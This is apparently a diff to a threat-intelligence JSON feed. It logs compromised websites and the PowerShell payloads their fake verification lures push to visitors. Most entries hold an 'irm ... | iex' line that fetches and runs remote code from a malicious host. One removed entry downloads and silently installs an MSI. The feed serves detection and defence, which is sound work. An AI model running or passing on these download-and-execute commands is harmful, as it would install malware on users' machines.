@@ -1,5 +1,196 @@
 [
   {
+    "UrlDomain": "andaluzia-design.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/64c531dea7398e63"
+    ],
+    "IP": [
+      "146.59.209.152"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/64c531dea7398e63')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/64c531dea7398e63"
+    ],
+    "ReportId": "cmwpb5tna22tb0omlxa02r7uu",
+    "ScannedAt": "2026-11-20T18:24:06.578000+00:00"
+  },
+  {
+    "UrlDomain": "saint-maximin-au-coeur.fr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a81feb0d517ad569"
+    ],
+    "IP": [
+      "51.91.236.255"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a81feb0d517ad569')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a81feb0d517ad569"
+    ],
+    "ReportId": "cmwpb5a4722so0oml24pnntoe",
+    "ScannedAt": "2026-11-20T18:23:41.241000+00:00"
+  },
+  {
+    "UrlDomain": "www.mfaa.it",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8718dba3c8e47827"
+    ],
+    "IP": [
+      "89.46.107.248"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8718dba3c8e47827')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8718dba3c8e47827"
+    ],
+    "ReportId": "cmwpb4wtl22rn0omlxja60ufu",
+    "ScannedAt": "2026-11-20T18:23:24.018000+00:00"
+  },
+  {
+    "UrlDomain": "manager-university.de",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a7a68d1534d986f1"
+    ],
+    "IP": [
+      "92.205.199.36"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a7a68d1534d986f1')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a7a68d1534d986f1"
+    ],
+    "ReportId": "cmwpb4dml22qi0omlny0uum8d",
+    "ScannedAt": "2026-11-20T18:22:59.132000+00:00"
+  },
+  {
+    "UrlDomain": "futureleadersincubator.org",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/6889c497c888f0fe",
+      "https://platform.twitter.com/jot.html"
+    ],
+    "IP": [
+      "192.185.21.174"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/6889c497c888f0fe')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/6889c497c888f0fe"
+    ],
+    "ReportId": "cmwpb3u0022p60omljpi0kl8j",
+    "ScannedAt": "2026-11-20T18:22:33.714000+00:00"
+  },
+  {
+    "UrlDomain": "www.dormireamarsala.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/aff7944081ac3ea9"
+    ],
+    "IP": [
+      "89.46.107.11"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/aff7944081ac3ea9')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/aff7944081ac3ea9"
+    ],
+    "ReportId": "cmwpb3nak22nm0omlq4s9yzvp",
+    "ScannedAt": "2026-11-20T18:22:24.996000+00:00"
+  },
+  {
+    "UrlDomain": "holtnow.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/9430b97dfeaa939b"
+    ],
+    "IP": [
+      "104.21.80.8"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9430b97dfeaa939b')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/9430b97dfeaa939b"
+    ],
+    "ReportId": "cmwpb2zg322mp0omlpb14eted",
+    "ScannedAt": "2026-11-20T18:21:54.089000+00:00"
+  },
+  {
+    "UrlDomain": "solenejansem.fr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ad53dc245f3233fa"
+    ],
+    "IP": [
+      "37.187.142.61"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ad53dc245f3233fa')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ad53dc245f3233fa"
+    ],
+    "ReportId": "cmwpb2sso22lz0omlpc7jkg69",
+    "ScannedAt": "2026-11-20T18:21:45.491000+00:00"
+  },
+  {
+    "UrlDomain": "vivamossinviolencia.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/081d30c2e8b12e71"
+    ],
+    "IP": [
+      "74.50.73.66"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/081d30c2e8b12e71')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/081d30c2e8b12e71"
+    ],
+    "ReportId": "cmwpb2fje22iu0oml5nlcwkff",
+    "ScannedAt": "2026-11-20T18:21:28.286000+00:00"
+  },
+  {
+    "UrlDomain": "myhelpper.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/eb7996060e99801d"
+    ],
+    "IP": [
+      "192.185.213.26"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7996060e99801d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/eb7996060e99801d"
+    ],
+    "ReportId": "cmwpb2cbu22ik0omlvze25amh",
+    "ScannedAt": "2026-11-20T18:21:24.097000+00:00"
+  },
+  {
     "UrlDomain": "cloudbasket.shop",
     "DeliveryUrl": [
       "fbifr.com"
@@ -12318,46 +12509,5 @@
     ],
     "ReportId": "cmwdxp8ne05qu0omlyd8d0l2n",
     "ScannedAt": "2026-11-12T19:21:49.887000+00:00"
-  },
-  {
-    "UrlDomain": "dawnconcepts.co.za",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "129.232.249.216"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwdvqh69058b0omlf4jk9bme",
-    "ScannedAt": "2026-11-12T18:26:48.346000+00:00"
-  },
-  {
-    "UrlDomain": "ctribhovandas.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.85.104"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/fe2aab3b32968bba",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/fe2aab3b32968bba"
-    ],
-    "ReportId": "cmwduvxv605530oml8atdneps",
-    "ScannedAt": "2026-11-12T18:03:03.530000+00:00"
   }
 ]
